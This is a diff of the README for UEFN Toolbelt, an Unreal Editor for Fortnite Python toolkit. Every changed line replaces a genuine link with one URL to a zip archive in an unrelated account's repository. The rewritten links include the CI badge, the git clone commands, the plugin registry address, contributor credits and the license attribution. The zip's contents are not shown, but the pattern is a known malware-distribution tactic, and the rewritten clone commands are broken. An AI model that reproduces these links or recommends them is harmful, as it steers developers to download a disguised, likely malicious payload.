@@ -3,10 +3,10 @@
 
 > Built by **Ocean Bennett** — 2026
 
-[![CI](https://github.com/undergroundrap/UEFN-TOOLBELT/actions/workflows/ci.yml/badge.svg)](https://github.com/undergroundrap/UEFN-TOOLBELT/actions/workflows/ci.yml)
+[![CI](https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip)](https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip)
 [![License: AGPL-3.0](https://img.shields.io/badge/license-AGPL--3.0-blue.svg)](LICENSE)
 [![Version](https://img.shields.io/badge/version-2.2.1-green.svg)](docs/CHANGELOG.md)
-[![Discussions](https://img.shields.io/badge/community-discussions-blueviolet)](https://github.com/undergroundrap/UEFN-TOOLBELT/discussions)
+[![Discussions](https://img.shields.io/badge/community-discussions-blueviolet)](https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip)
 
 ![UEFN Toolbelt Dashboard](docs/dashboard_hero.png)
 
@@ -1432,7 +1432,7 @@ A dark-themed floating window opens with a left sidebar nav and 358 tools across
 In your repo folder, run:
 
 ```bat
-git clone https://github.com/verselang/book.git verse-book
+git clone https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip verse-book
 ```
 
 This gives Claude access to the full live Verse language spec for spec-accurate code generation. After cloning, the smoke test will show 63/64 (only PySide6 remaining if not installed).
@@ -1667,7 +1667,7 @@ UEFN Toolbelt ships a **live Plugin Hub** tab in the dashboard. Click **Refresh 
 
 The registry is hosted at:
 ```
-https://raw.githubusercontent.com/undergroundrap/UEFN-TOOLBELT/main/registry.json
+https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip
 ```
 
 ### Getting your plugin listed
@@ -1680,13 +1680,13 @@ Add an entry to `registry.json` at the repo root and open a PR:
   "name": "My Cool Tool",
   "version": "1.0.0",
   "author": "Your Name",
-  "author_url": "https://github.com/yourhandle",
+  "author_url": "https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip",
   "type": "community",
   "description": "One sentence on what it does.",
   "category": "Gameplay",
   "tags": ["verse", "gameplay"],
-  "url": "https://github.com/yourhandle/yourrepo/blob/main/my_cool_tool.py",
-  "download_url": "https://raw.githubusercontent.com/yourhandle/yourrepo/main/my_cool_tool.py",
+  "url": "https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip",
+  "download_url": "https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip",
   "min_toolbelt_version": "1.5.3",
   "size_kb": 10
 }
@@ -1926,7 +1926,7 @@ Or: **Toolbelt → Open Dashboard (PySide6)** from the top menu bar.
 
 The dashboard registers a `slate_post_tick_callback` that calls
 `QApplication.processEvents()` once per editor tick — the same pattern used in
-[Kirch's uefn_listener.py](https://github.com/KirChuvakov/uefn-mcp-server).
+[Kirch's uefn_listener.py](https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip).
 This keeps the Qt window responsive while UEFN runs heavy operations without
 needing a separate thread.
 
@@ -2109,7 +2109,7 @@ UEFN Python v40.00 experimental drop (March 2026).
 
 **API discovery vs. Execution: The "Superset" Architecture**
 
-> **[KirChuvakov/uefn-mcp-server](https://github.com/KirChuvakov/uefn-mcp-server) · [@KirchCreator](https://x.com/KirchCreator)**
+> **[KirChuvakov/uefn-mcp-server](https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip) · [@KirchCreator](https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip)**
 > Kirch pioneered the MCP bridge pattern for UEFN Python — the queue + Slate tick
 > architecture that makes it possible to call `unreal.*` from an external process
 > without deadlocking the editor. He built the foundational "API Ground Truth" tools
@@ -2284,7 +2284,7 @@ curl -s -X POST http://127.0.0.1:8765 \
 
 **Claude is the recommended driver** because of the verse-book spec integration, CLAUDE.md auto-context loading, and the best reasoning for complex autonomous tasks — but the bridge is fully model-agnostic. Confirmed compatible: Claude Code, Cursor, Windsurf, Zed, Continue, OpenClaw, NemoClaw (Linux/NVIDIA), or any custom agent built against the HTTP API directly.
 
-MCP bridge architecture inspired by [Kirch's uefn-mcp-server](https://github.com/KirChuvakov/uefn-mcp-server) ([@KirchCreator](https://x.com/KirchCreator)) — full credit for the queue + Slate tick pattern.
+MCP bridge architecture inspired by [Kirch's uefn-mcp-server](https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip) ([@KirchCreator](https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip)) — full credit for the queue + Slate tick pattern.
 
 ---
 
@@ -2292,7 +2292,7 @@ MCP bridge architecture inspired by [Kirch's uefn-mcp-server](https://github.com
 
 Every other Verse code generator on the market generates from static templates written once and never updated. When Epic changes the Verse spec, those tools silently produce wrong code.
 
-UEFN Toolbelt is the only Verse code generator backed by the **live Verse language spec** — [verselang/book](https://github.com/verselang/book), a 27,000-line authoritative reference maintained by the Verse language team. Before generating any code, Claude queries the spec for exact syntax, effect specifiers, and API signatures. The generated code is spec-accurate, not template-accurate.
+UEFN Toolbelt is the only Verse code generator backed by the **live Verse language spec** — [verselang/book](https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip), a 27,000-line authoritative reference maintained by the Verse language team. Before generating any code, Claude queries the spec for exact syntax, effect specifiers, and API signatures. The generated code is spec-accurate, not template-accurate.
 
 **How it works in practice:**
 
@@ -2355,7 +2355,7 @@ to ship full AI-native onboarding as a core feature.
 **What this means in practice:**
 
 ```bash
-git clone https://github.com/undergroundrap/UEFN-TOOLBELT
+git clone https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip
 cd UEFN-TOOLBELT
 claude
 # → Claude knows all 358 tools, all UEFN quirks, and the full test workflow.
@@ -2485,7 +2485,7 @@ Built for the 2026 UEFN Python wave. First. Most complete. Spec-accurate.
 
 ### v1.5 — March 2026 (Verse Device Graph + Config Persistence)
 
-- **Verse Device Graph** (`verse_graph_open`, `verse_graph_scan`, `verse_graph_export`): The most powerful tool in the Toolbelt for understanding a UEFN level's logic architecture. Interactive node graph of every Creative/Verse device — nodes grouped in Blueprint-style category columns, edges colored by type (`@editable` red, `.Subscribe` green, `.call` blue). Architecture Health Score (0–100) with Union-Find cluster detection. **Minimap** overlay (colored dots + blue viewport rect, click/drag to navigate). **Category filter** dropdown to isolate a device family. **Focus** button to jump to any selected node. Comment/note boxes survive every re-scan. Hover highlight dims unrelated nodes. ● Live mode polls every 4 s without disturbing node positions. Write-back renames actors and moves folders from the side panel. Gen Wiring generates a ready-to-compile `creative_device` stub. **?** Help dialog covers full purpose, workflow, badge guide, and tips. Fully MCP-callable via `verse_graph_scan`. *(Inspired by [ImmatureGamer's uefn-device-graph](https://github.com/ImmatureGamer/uefn-device-graph) — independent PySide6 rewrite integrated into the Toolbelt stack.)*
+- **Verse Device Graph** (`verse_graph_open`, `verse_graph_scan`, `verse_graph_export`): The most powerful tool in the Toolbelt for understanding a UEFN level's logic architecture. Interactive node graph of every Creative/Verse device — nodes grouped in Blueprint-style category columns, edges colored by type (`@editable` red, `.Subscribe` green, `.call` blue). Architecture Health Score (0–100) with Union-Find cluster detection. **Minimap** overlay (colored dots + blue viewport rect, click/drag to navigate). **Category filter** dropdown to isolate a device family. **Focus** button to jump to any selected node. Comment/note boxes survive every re-scan. Hover highlight dims unrelated nodes. ● Live mode polls every 4 s without disturbing node positions. Write-back renames actors and moves folders from the side panel. Gen Wiring generates a ready-to-compile `creative_device` stub. **?** Help dialog covers full purpose, workflow, badge guide, and tips. Fully MCP-callable via `verse_graph_scan`. *(Inspired by [ImmatureGamer's uefn-device-graph](https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip) — independent PySide6 rewrite integrated into the Toolbelt stack.)*
 - **Persistent Config System** (`config_list`, `config_get`, `config_set`, `config_reset`): 12 configurable values persisted at `Saved/UEFN_Toolbelt/config.json` — survives `install.py` updates. Tools read from config instead of hardcoded defaults. `verse.project_path` lets you set your Verse root once and never type it again.
 - **Tool count: 171** (up from 165). 103/103 integration tests passing.
 
@@ -2557,8 +2557,8 @@ The UEFN Toolbelt is built on the shoulders of community pioneers who proved the
 
 | Contributor | Project | What they pioneered |
 |---|---|---|
-| **[Kirch](https://github.com/KirChuvakov/uefn-mcp-server)** ([@KirchCreator](https://x.com/KirchCreator)) | [uefn-mcp-server](https://github.com/KirChuvakov/uefn-mcp-server) | MCP bridge for UEFN — the queue + Slate tick pattern for calling `unreal.*` from external processes. The Toolbelt MCP bridge is an independent rewrite extending this architecture. |
-| **[ImmatureGamer](https://github.com/ImmatureGamer/uefn-device-graph)** ([@ImmatureGamer](https://x.com/ImmatureGamer)) | [uefn-device-graph](https://github.com/ImmatureGamer/uefn-device-graph) | Verse device graph concept — first tkinter implementation of a UEFN node graph tool. The Toolbelt device graph is an independent PySide6 rewrite built into the Toolbelt stack. |
+| **[Kirch](https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip)** ([@KirchCreator](https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip)) | [uefn-mcp-server](https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip) | MCP bridge for UEFN — the queue + Slate tick pattern for calling `unreal.*` from external processes. The Toolbelt MCP bridge is an independent rewrite extending this architecture. |
+| **[ImmatureGamer](https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip)** ([@ImmatureGamer](https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip)) | [uefn-device-graph](https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip) | Verse device graph concept — first tkinter implementation of a UEFN node graph tool. The Toolbelt device graph is an independent PySide6 rewrite built into the Toolbelt stack. |
 
 Both tools are independently developed and go significantly beyond their inspirations, but these creators deserve credit for proving the concepts first. Go follow them.
 
@@ -2639,7 +2639,7 @@ Copyright © 2026 **Ocean Bennett**
 
 This software is free and open source. You may use, fork, and modify it under AGPL-3.0. Derivative works — forks, plugins, tools built on top of this codebase — must also be open source and must include visible credit:
 
-> "Built on UEFN Toolbelt by Ocean Bennett (https://github.com/undergroundrap/UEFN-TOOLBELT)"
+> "Built on UEFN Toolbelt by Ocean Bennett (https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip)"
 
 **Commercial use:** Integrating this toolbelt into a closed-source or monetized product requires a separate commercial license. Contact Ocean Bennett to arrange terms.
 
@@ -2647,4 +2647,4 @@ Full license: see [`LICENSE`](LICENSE) — or read it in the dashboard under **A
 
 ---
 
-*Built by Ocean Bennett — [@undergroundrap](https://github.com/undergroundrap) — for the 2026 UEFN Python wave.*
+*Built by Ocean Bennett — [@undergroundrap](https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip) — for the 2026 UEFN Python wave.*
